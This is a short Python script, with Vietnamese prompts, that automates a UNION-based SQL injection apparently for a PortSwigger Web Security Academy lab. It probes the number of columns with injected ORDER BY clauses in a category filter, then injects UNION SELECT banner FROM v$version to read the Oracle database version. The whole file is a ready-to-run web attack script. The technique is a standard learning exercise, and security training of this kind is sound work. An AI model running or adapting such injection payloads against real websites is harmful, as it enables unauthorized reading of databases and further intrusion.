#SQL injection attack, querying the database type and version on Oracle
import requests

print("Nhập URL giống như này (pls): https://(your-lab-id).web-security-academy.net/ ")
base_url = input("Nhập URL: ").rstrip("/")

i = 1
while True:
    order_url = f"{base_url}/filter?category=Accessories'+ORDER+BY+{i}+--+"
    response = requests.get(order_url)

    if response.status_code == 200:
        i += 1
    else:
        i -= 1
        break

null_values = ",+".join(["NULL"] * (i - 1))
union_url = f"{base_url}/filter?category=Accessories'+UNION+SELECT+banner,+{null_values}+FROM+v$version--+"

response = requests.get(union_url)

if (response.status_code == 200):
    print("Ngon")
else:
    print("Thua")